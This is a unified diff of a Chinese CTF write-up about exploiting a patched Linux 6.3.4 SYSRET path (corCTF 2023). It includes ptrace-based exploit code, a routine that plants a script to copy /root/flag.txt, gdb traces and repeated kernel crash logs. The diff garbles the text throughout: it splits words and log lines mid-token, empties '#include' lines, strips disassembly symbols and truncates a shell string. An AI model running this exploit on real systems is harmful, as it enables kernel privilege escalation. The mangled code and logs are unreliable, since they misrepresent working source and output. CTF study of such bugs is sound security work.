@@ -109,7 +109,8 @@ FizzBuzz101大师在题目（https://github.com/Crusaders-of-Rust/corCTF-2023-pu
  * 然后从 MSR 寄存器组中加载新的 ss、cs 和 rip，rflags 的一些标志位会被清除
  * syscall 不在栈上保存任何值并且不会改变 rsp
  *
- * Registers on entry:
+ * Registers on en
+try:
  * 下面是 syscall 使用的一些寄存器
  * rax  system call number  系统调用号
  * rcx  return address 返回地址
@@ -256,7 +257,8 @@ syscall_return_via_sysret:
 	POP_REGS pop_rdi=0 /* 恢复相关寄存器的值，这里可以调试看更明显 */
 
 	/*
-	 * Now all regs are restored except RSP and RDI.
+	 * Now all regs are restored 
+except RSP and RDI.
 	 * Save old stack pointer and switch to trampoline stack.
 	 */
 	movq	%rsp, %rdi
@@ -267,7 +269,8 @@ syscall_return_via_sysret:
 	pushq	(%rdi) /* RDI */
 
 	/*
-	 * We are on the trampoline stack.  All regs except RDI are live.
+	 * We are on the trampoline stack.  All regs 
+except RDI are live.
 	 * We can do future final exit work right here.
 	 */
 	STACKLEAK_ERASE_NOCLOBBER
@@ -394,30 +397,38 @@ ctf@corctf:~$ ./poc
 [   10.018619] double fault: 0000 [#1] PREEMPT SMP NOPTI
 [   10.018658] CPU: 0 PID: 77 Comm: poc Not tainted 6.3.4 #14
 [   10.018660] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
-[   10.018662] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   10.018662] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   10.018900] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   10.018902] RSP: 0018:00000000deadbeef EFLAGS: 00010046
+[   10.018902] RSP: 0018:
+00000000deadbeef EFLAGS: 00010046
 [   10.018937] RAX: 000000000000004e RBX: b3061c50e54d3600 RCX: 8000000000000000
 [   10.018938] RDX: 00000000004bf0c0 RSI: 000000000040189d RDI: 0000000000000000
 [   10.018939] RBP: 0000000000000000 R08: 0000000000008000 R09: 0000000000000001
 [   10.018940] R10: 0000000000000001 R11: 0000000000000246 R12: 00000001002c307d
 [   10.018941] R13: 0000000000000000 R14: 0000000000447a26 R15: 00007ffe8c607976
-[   10.018942] FS:  0000000000402fcc(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   10.018942] FS:  0000000000402fcc(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   10.018944] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   10.018945] CR2: 00000000deadbed8 CR3: 0000000100a8c001 CR4: 0000000000770ef0
 [   10.019027] PKRU: 55555554
 [   10.019027] Call Trace:
 [   10.019096] Modules linked in:
 [   10.083849] ---[ end trace 0000000000000000 ]---
-[   10.083854] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   10.083854] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   10.083865] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   10.083867] RSP: 0018:00000000deadbeef EFLAGS: 00010046
+[   10.083867] RSP: 0018:
+00000000deadbeef EFLAGS: 00010046
 [   10.083869] RAX: 000000000000004e RBX: b3061c50e54d3600 RCX: 8000000000000000
 [   10.083870] RDX: 00000000004bf0c0 RSI: 000000000040189d RDI: 0000000000000000
 [   10.083871] RBP: 0000000000000000 R08: 0000000000008000 R09: 0000000000000001
 [   10.083872] R10: 0000000000000001 R11: 0000000000000246 R12: 00000001002c307d
 [   10.083921] R13: 0000000000000000 R14: 0000000000447a26 R15: 00007ffe8c607976
-[   10.083934] FS:  0000000000402fcc(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   10.083934] FS:  0000000000402fcc(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   10.083935] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   10.083936] CR2: 00000000deadbed8 CR3: 0000000100a8c001 CR4: 0000000000770ef0
 [   10.084008] PKRU: 55555554
@@ -448,9 +459,11 @@ int main() {
 [   11.949132] double fault: 0000 [#1] PREEMPT SMP NOPTI
 [   11.949160] CPU: 0 PID: 77 Comm: poc Not tainted 6.3.4 #14
 [   11.949163] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
-[   11.949164] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   11.949164] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   11.949350] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   11.949351] RSP: 0018:00007ffe97c52690 EFLAGS: 00010046
+[   11.949351] RSP: 0018:
+00007ffe97c52690 EFLAGS: 00010046
 ......
 
 所以这里似乎跟rsp的值没啥关系。
@@ -533,7 +546,8 @@ int main() {
    0xffffffff817f2438 <exc_general_protection+8>:       mov    rbp,rdi
    0xffffffff817f243b <exc_general_protection+11>:      push   rbx
    0xffffffff817f243c <exc_general_protection+12>:      sub    rsp,0x70
-   0xffffffff817f2440 <exc_general_protection+16>:      mov    rax,QWORD PTR gs:0x28 <=== double fault
+   0xffffffff817f2440 <exc_general_protection+16>:      mov    rax,QWORD PTR gs:
+0x28 <=== double fault
 ......
 
 而在exc_general_protection中用户态gs被首次使用从而导致double fault。
@@ -585,7 +599,7 @@ ctf@corctf:~$ ./poc
 第一版exp：
 
 #include <stdio.h>
-#include <unistd.h>
+#include 
 #include <string.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -663,15 +677,19 @@ get_flag：
 [   23.186155] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
 [   23.191255] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
 [   23.197747] Workqueue: events_unbound call_usermodehelper_exec_work
-[   23.202854] RIP: 0010:inc_rlimit_ucounts+0x31/0x70
+[   23.202854] RIP: 0010:
+inc_rlimit_ucounts+0x31/0x70
 [   23.206428] Code: f0 48 89 f9 45 31 d2 49 b9 ff ff ff ff ff ff ff 7f 4a 8d 34 c5 70 00 00 00 49 83 c0 46 eb 1c 48 39 cf 4c 0f 44 d0 48 8b 41 10 <48> 8b 88 e0 01 00 00 4e 8b 4c c8
-[   23.226013] RSP: 0018:ffffc900000e3cb8 EFLAGS: 00010246
+[   23.226013] RSP: 0018:
+ffffc900000e3cb8 EFLAGS: 00010246
 [   23.229254] RAX: 0000000000000000 RBX: ffff888101038000 RCX: ffffffff8203b6c0
 [   23.233876] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
 [   23.243660] RBP: ffffffff8203b6c0 R08: 0000000000000046 R09: 7fffffffffffffff
 [   23.251135] R10: 0000000000000001 R11: 0000000000000025 R12: 0000000000000000
 [   23.255452] R13: ffffc900000e3df0 R14: 00000000ffffffff R15: 0000000000800100
-[   23.260494] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
+[   23.260494] FS:  0000000000000000(0000) GS:
+ffff88813bc00000(0000) knlGS:
+0000000000000000
 [   23.268356] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   23.272230] CR2: 00000000000001e0 CR3: 0000000100a8c006 CR4: 0000000000770ef0
 ......
@@ -679,34 +697,34 @@ get_flag：
 可以看到最后在get_flag 时，在inc_rlimit_ucounts中发生了#PF，既然是缺页故障，拿必然就是某个读取值存在问题了。
 
 (remote) gef➤  gef-remox/40gi inc_rlimit_ucounts
-   0xffffffff8109e980 <inc_rlimit_ucounts>:    test   rdi,rdi
-   0xffffffff8109e983 <inc_rlimit_ucounts+3>:   je     0xffffffff8109e9e1 <inc_rlimit_ucounts+97>
-   0xffffffff8109e985 <inc_rlimit_ucounts+5>:   mov    r8d,esi
-   0xffffffff8109e988 <inc_rlimit_ucounts+8>:   mov    rcx,rdi
-   0xffffffff8109e98b <inc_rlimit_ucounts+11>:  xor    r10d,r10d
-   0xffffffff8109e98e <inc_rlimit_ucounts+14>:  movabs r9,0x7fffffffffffffff
-   0xffffffff8109e998 <inc_rlimit_ucounts+24>:  lea    rsi,[r8*8+0x70]
-   0xffffffff8109e9a0 <inc_rlimit_ucounts+32>:  add    r8,0x46
-   0xffffffff8109e9a4 <inc_rlimit_ucounts+36>:  jmp    0xffffffff8109e9c2 <inc_rlimit_ucounts+66>
-   0xffffffff8109e9a6 <inc_rlimit_ucounts+38>:  cmp    rdi,rcx
-   0xffffffff8109e9a9 <inc_rlimit_ucounts+41>:  cmove  r10,rax
-   0xffffffff8109e9ad <inc_rlimit_ucounts+45>:  mov    rax,QWORD PTR [rcx+0x10]
-   0xffffffff8109e9b1 <inc_rlimit_ucounts+49>:  mov    rcx,QWORD PTR [rax+0x1e0] <==== PAGE FAULT
+   0xffffffff8109e980 :    test   rdi,rdi
+   0xffffffff8109e983 :   je     0xffffffff8109e9e1 
+   0xffffffff8109e985 :   mov    r8d,esi
+   0xffffffff8109e988 :   mov    rcx,rdi
+   0xffffffff8109e98b :  xor    r10d,r10d
+   0xffffffff8109e98e :  movabs r9,0x7fffffffffffffff
+   0xffffffff8109e998 :  lea    rsi,[r8*8+0x70]
+   0xffffffff8109e9a0 :  add    r8,0x46
+   0xffffffff8109e9a4 :  jmp    0xffffffff8109e9c2 
+   0xffffffff8109e9a6 :  cmp    rdi,rcx
+   0xffffffff8109e9a9 :  cmove  r10,rax
+   0xffffffff8109e9ad :  mov    rax,QWORD PTR [rcx+0x10]
+   0xffffffff8109e9b1 :  mov    rcx,QWORD PTR [rax+0x1e0] <==== PAGE FAULT
 ......
 
 哪这里多半就是rax的值存在问题了，调试跟踪：
 
 $rax   : 0x0
 ......
-   0xffffffff8109e9a6 <inc_rlimit_ucounts+38> cmp    rdi, rcx
-   0xffffffff8109e9a9 <inc_rlimit_ucounts+41> cmove  r10, rax
-   0xffffffff8109e9ad <inc_rlimit_ucounts+45> mov    rax, QWORD PTR [rcx+0x10]
-●→ 0xffffffff8109e9b1 <inc_rlimit_ucounts+49> mov    rcx, QWORD PTR [rax+0x1e0]
-   0xffffffff8109e9b8 <inc_rlimit_ucounts+56> mov    r9, QWORD PTR [rax+r8*8+0x8
+   0xffffffff8109e9a6  cmp    rdi, rcx
+   0xffffffff8109e9a9  cmove  r10, rax
+   0xffffffff8109e9ad  mov    rax, QWORD PTR [rcx+0x10]
+●→ 0xffffffff8109e9b1  mov    rcx, QWORD PTR [rax+0x1e0]
+   0xffffffff8109e9b8  mov    r9, QWORD PTR [rax+r8*8+0x8
 
 可以看到这里的rax = 0，所以mov rcx, QWORD PTR [rax+0x1e0]就会出现#PF，而我们向前看的话会发现：
 
-0xffffffff8109e9ad <inc_rlimit_ucounts+45> mov    rax, QWORD PTR [rcx+0x10]
+0xffffffff8109e9ad  mov    rax, QWORD PTR [rcx+0x10]
 
 即rax的值为QWORD PTR [rcx + 0x10]：
 
@@ -751,10 +769,10 @@ $rax   : 0x0
 
 $rax   : 0xaaaaaaad
 ......
-   0xffffffff8109e9a6 <inc_rlimit_ucounts+38>  cmp    rdi, rcx
-   0xffffffff8109e9a9 <inc_rlimit_ucounts+41>  cmove   r10, rax
-   0xffffffff8109e9ad <inc_rlimit_ucounts+45>  mov    rax, QWORD PTR [rcx+0x10]
-●→ 0xffffffff8109e9b1 <inc_rlimit_ucounts+49> mov    rcx, QWORD PTR [rax+0x1e0]
+   0xffffffff8109e9a6   cmp    rdi, rcx
+   0xffffffff8109e9a9   cmove   r10, rax
+   0xffffffff8109e9ad   mov    rax, QWORD PTR [rcx+0x10]
+●→ 0xffffffff8109e9b1  mov    rcx, QWORD PTR [rax+0x1e0]
 ......
 (remote) gef➤  x/16gx $rcx
 0xffffffff8203b6c0:     0x00000000aaaaaaab      0x00000000aaaaaaac
@@ -771,7 +789,7 @@ $rax   : 0xaaaaaaad
 最后exp如下（关闭kaslr）：
 
 #include <stdio.h>
-#include <unistd.h>
+#include 
 #include <string.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -842,7 +860,8 @@ void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
 }
 
 void pre_get_flag(){
-        system("echo -ne '#!/bin/shncp /root/flag.txt /tmp/flag.txtnchown ctf:ctf /tmp;
+        system("echo -ne '#!/bin/shncp /root/flag.txt /tmp/flag.txtnchown ctf:
+ctf /tmp;
         system("chmod +x /tmp/x");
         system("echo -ne '\xff\xff\xff\xff' > /tmp/dummy");
         system("chmod +x /tmp/dummy");
@@ -903,30 +922,38 @@ ctf@corctf:~$ ./poc
 [   54.860622] general protection fault, maybe for address 0x52: 0000 [#1] PREEMPT SMP NOPTI
 [   54.863942] CPU: 0 PID: 81 Comm: poc Not tainted 6.3.4 #14
 [   54.866204] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
-[   54.869854] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   54.869854] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   54.875756] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   54.897567] RSP: 0018:ffffffff8203b8b8 EFLAGS: 00010046
+[   54.897567] RSP: 0018:
+ffffffff8203b8b8 EFLAGS: 00010046
 [   54.900951] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
 [   54.908092] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
 [   54.912087] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
 [   54.916936] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
 [   54.923207] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
-[   54.928403] FS:  0000782f706d742f(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   54.928403] FS:  0000782f706d742f(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   54.934439] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   54.941481] CR2: 0000000000c72840 CR3: 0000000100acc003 CR4: 0000000000770ef0
 [   54.946718] PKRU: 55555554
 [   54.948308] Call Trace:
 [   54.950252] Modules linked in:
 [   54.952905] ---[ end trace 0000000000000000 ]---
-[   54.956570] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   54.956570] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   54.959973] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   54.975296] RSP: 0018:ffffffff8203b8b8 EFLAGS: 00010046
+[   54.975296] RSP: 0018:
+ffffffff8203b8b8 EFLAGS: 00010046
 [   54.979096] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
 [   54.983603] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
 [   54.990378] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
 [   54.996204] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
 [   55.000951] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
-[   55.006682] FS:  0000782f706d742f(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   55.006682] FS:  0000782f706d742f(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   55.012856] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   55.015931] CR2: 0000000000c72840 CR3: 0000000100acc003 CR4: 0000000000770ef0
 [   55.022360] PKRU: 55555554
@@ -937,30 +964,38 @@ ctf@corctf:~$ ./poc
 [   55.873686] general protection fault, maybe for address 0x54: 0000 [#2] PREEMPT SMP NOPTI
 [   55.881308] CPU: 0 PID: 83 Comm: poc Tainted: G      D            6.3.4 #14
 [   55.883938] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
-[   55.889846] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   55.889846] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   55.894069] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   55.911307] RSP: 0018:ffffffff8203b760 EFLAGS: 00010046
+[   55.911307] RSP: 0018:
+ffffffff8203b760 EFLAGS: 00010046
 [   55.915745] RAX: 0000000000000054 RBX: 0000000000000000 RCX: 8000000000000000
 [   55.922827] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
 [   55.927877] RBP: 0000002e00000000 R08: 0000000000000000 R09: 0000000000000000
 [   55.934469] R10: 0000000000000000 R11: 0000000000000246 R12: ffffffff8203a320
 [   55.939055] R13: ffffffff82640160 R14: ffff888100049600 R15: 0000000000000000
-[   55.944725] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   55.944725] FS:  0000000000000000(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   55.950507] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   55.953619] CR2: 0000000000c72840 CR3: 0000000100acc006 CR4: 0000000000770ef0
 [   55.957433] PKRU: 55555554
 [   55.958668] Call Trace:
 [   55.960963] Modules linked in:
 [   55.964387] ---[ end trace 0000000000000000 ]---
-[   55.968013] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   55.968013] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   55.971660] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   55.986549] RSP: 0018:ffffffff8203b8b8 EFLAGS: 00010046
+[   55.986549] RSP: 0018:
+ffffffff8203b8b8 EFLAGS: 00010046
 [   55.991037] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
 [   55.995083] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
 [   56.001529] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
 [   56.006144] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
 [   56.012928] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
-[   56.019846] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   56.019846] FS:  0000000000000000(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   56.025685] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   56.031767] CR2: 0000000000c72840 CR3: 0000000100acc006 CR4: 0000000000770ef0
 [   56.039399] PKRU: 55555554
@@ -968,20 +1003,25 @@ ctf@corctf:~$ ./poc
 
 [+] get_flag
 [   56.889309] ------------[ cut here ]------------
-[   56.894489] WARNING: CPU: 0 PID: 27 at kernel/ucount.c:285 dec_rlimit_ucounts+0x4f/0x60
+[   56.894489] WARNING: CPU: 0 PID: 27 at kernel/ucount.c:
+285 dec_rlimit_ucounts+0x4f/0x60
 [   56.905581] Modules linked in:
 [   56.908304] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
 [   56.915819] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
 [   56.920894] Workqueue: events_unbound call_usermodehelper_exec_work
-[   56.925990] RIP: 0010:dec_rlimit_ucounts+0x4f/0x60
+[   56.925990] RIP: 0010:
+dec_rlimit_ucounts+0x4f/0x60
 [   56.931058] Code: c1 04 31 48 29 d0 78 22 48 39 cf 4c 0f 44 c0 48 8b 41 10 48 8b 88 e0 01 00 00 48 85 c9 75 db 4d 85 c0 0f 94 c0 c3 cc cc cc cc <0f> 0b eb da 31 c0 c3 cc cc cc c0
-[   56.948338] RSP: 0018:ffffc900000e3d00 EFLAGS: 00010297
+[   56.948338] RSP: 0018:
+ffffc900000e3d00 EFLAGS: 00010297
 [   56.951704] RAX: ffffffffffffffff RBX: ffffc900000e3e08 RCX: ffffffff8203b6c0
 [   56.957035] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
 [   56.961815] RBP: ffff88810103c140 R08: ffffffffffffffff R09: ffffffffffffffff
 [   56.968173] R10: 00000000000000bb R11: 00000000000009e9 R12: ffffffff8203b6c0
 [   56.972953] R13: 0000000000000010 R14: dead000000000122 R15: 0000000000000000
-[   56.979591] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
+[   56.979591] FS:  0000000000000000(0000) GS:
+ffff88813bc00000(0000) knlGS:
+0000000000000000
 [   56.987164] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   56.991283] CR2: 000000000065eff0 CR3: 000000000202c006 CR4: 0000000000770ef0
 [   56.998861] PKRU: 55555554
@@ -1108,18 +1148,8 @@ https://bbs.kanxue.com/user-home-965217.htm
 ```
 一
 前言
-```
-
-
-
-```
 二
 漏洞分析
-```
-
-
-
-```
 #!/bin/sh
 qemu-system-x86_64 
     -m 4096M 
@@ -1134,11 +1164,6 @@ qemu-system-x86_64 
     -device e1000,netdev=net 
     -initrd "./initramfs.cpio.gz" 
     -enable-kvm
-```
-
-
-
-```
 --- orig_entry_64.S
 +++ linux-6.3.4/arch/x86/entry/entry_64.S
 @@ -150,13 +150,13 @@
@@ -1159,11 +1184,6 @@ qemu-system-x86_64 
 
         cmpq    $__USER_CS, CS(%rsp)            /* CS must match SYSRET */
         jne     swapgs_restore_regs_and_return_to_usermode
-```
-
-
-
-```
 /*
   * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP
   * in kernel space.  This essentially lets the user take over
@@ -1175,11 +1195,6 @@ qemu-system-x86_64 
   * Change top bits to match most significant bit (47th or 56th bit
   * depending on paging mode) in the address.
   */
-```
-
-
-
-```
 /*
  * 64-bit SYSCALL instruction entry. Up to 6 arguments in registers.
  * 64-bit 的 syscall 指令入口，最多 6 个寄存器参数
@@ -1204,7 +1219,8 @@ qemu-system-x86_64 
  * 然后从 MSR 寄存器组中加载新的 ss、cs 和 rip，rflags 的一些标志位会被清除
  * syscall 不在栈上保存任何值并且不会改变 rsp
  *
- * Registers on entry:
+ * Registers on en
+try:
  * 下面是 syscall 使用的一些寄存器
  * rax  system call number  系统调用号
  * rcx  return address 返回地址
@@ -1293,14 +1309,14 @@ SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)
 	 * Change top bits to match most significant bit (47th or 56th bit
 	 * depending on paging mode) in the address.
 	 */
-#ifdef CONFIG_X86_5LEVEL
+    #ifdef CONFIG_X86_5LEVEL
 	ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", 
  "shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
-#else
+    #else
 	/* canonical address 检查 */
 	shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
 	sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
-#endif
+    #endif
 
 	/* If this changed %rcx, it was not canonical */
 	cmpq	%rcx, %r11
@@ -1351,7 +1367,8 @@ syscall_return_via_sysret:
 	POP_REGS pop_rdi=0 /* 恢复相关寄存器的值，这里可以调试看更明显 */
 
 	/*
-	 * Now all regs are restored except RSP and RDI.
+	 * Now all regs are restored 
+except RSP and RDI.
 	 * Save old stack pointer and switch to trampoline stack.
 	 */
 	movq	%rsp, %rdi
@@ -1362,7 +1379,8 @@ syscall_return_via_sysret:
 	pushq	(%rdi) /* RDI */
 
 	/*
-	 * We are on the trampoline stack.  All regs except RDI are live.
+	 * We are on the trampoline stack.  All regs 
+except RDI are live.
 	 * We can do future final exit work right here.
 	 */
 	STACKLEAK_ERASE_NOCLOBBER
@@ -1379,11 +1397,6 @@ SYM_INNER_LABEL(entry_SYSRETQ_end, SYM_L_GLOBAL)
 	ANNOTATE_NOENDBR
 	int3
 SYM_CODE_END(entry_SYSCALL_64)
-```
-
-
-
-```
 ------------------ INTEL -------------------|-------------------  AMD ----------------------
 ...                                         | ...
 IF (operand size is 64-bit)                 | SYSRET_64BIT_MODE:
@@ -1397,24 +1410,9 @@ FI;                                      �
 CS.Selector := CS.Selector OR 3;            | EXIT
             (* RPL forced to 3 *)           |
 ...                                         |
-```
-
-
-
-```
 三
 漏洞利用
-```
-
-
-
-```
 Most ptrace paths go via the interface that catches the process using the signal handler which always returns with IRET. However, there are a few paths that can get caught with ptrace_event() instaed of the signal path. Refer to the PoC code for an example of using fork() with ptrace to force such a path.
-```
-
-
-
-```
 void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
     struct user_regs_struct regs;
     int status;
@@ -1459,11 +1457,6 @@ void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
     ptrace(PTRACE_CONT, chld, 0, 0);
     ptrace(PTRACE_DETACH, chld, 0, 0);
 }
-```
-
-
-
-```
 int main() {
 
         struct user_regs_struct regs;
@@ -1474,50 +1467,48 @@ int main() {
         puts("[+] EXP NEVER END");
         return 0;
 }
-```
-
-
-
-```
 ctf@corctf:~$ ./poc
 [   10.018563] traps: PANIC: double fault, error_code: 0x0
 [   10.018619] double fault: 0000 [#1] PREEMPT SMP NOPTI
 [   10.018658] CPU: 0 PID: 77 Comm: poc Not tainted 6.3.4 #14
 [   10.018660] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
-[   10.018662] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   10.018662] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   10.018900] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   10.018902] RSP: 0018:00000000deadbeef EFLAGS: 00010046
+[   10.018902] RSP: 0018:
+00000000deadbeef EFLAGS: 00010046
 [   10.018937] RAX: 000000000000004e RBX: b3061c50e54d3600 RCX: 8000000000000000
 [   10.018938] RDX: 00000000004bf0c0 RSI: 000000000040189d RDI: 0000000000000000
 [   10.018939] RBP: 0000000000000000 R08: 0000000000008000 R09: 0000000000000001
 [   10.018940] R10: 0000000000000001 R11: 0000000000000246 R12: 00000001002c307d
 [   10.018941] R13: 0000000000000000 R14: 0000000000447a26 R15: 00007ffe8c607976
-[   10.018942] FS:  0000000000402fcc(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   10.018942] FS:  0000000000402fcc(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   10.018944] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   10.018945] CR2: 00000000deadbed8 CR3: 0000000100a8c001 CR4: 0000000000770ef0
 [   10.019027] PKRU: 55555554
 [   10.019027] Call Trace:
 [   10.019096] Modules linked in:
 [   10.083849] ---[ end trace 0000000000000000 ]---
-[   10.083854] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   10.083854] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   10.083865] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   10.083867] RSP: 0018:00000000deadbeef EFLAGS: 00010046
+[   10.083867] RSP: 0018:
+00000000deadbeef EFLAGS: 00010046
 [   10.083869] RAX: 000000000000004e RBX: b3061c50e54d3600 RCX: 8000000000000000
 [   10.083870] RDX: 00000000004bf0c0 RSI: 000000000040189d RDI: 0000000000000000
 [   10.083871] RBP: 0000000000000000 R08: 0000000000008000 R09: 0000000000000001
 [   10.083872] R10: 0000000000000001 R11: 0000000000000246 R12: 00000001002c307d
 [   10.083921] R13: 0000000000000000 R14: 0000000000447a26 R15: 00007ffe8c607976
-[   10.083934] FS:  0000000000402fcc(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
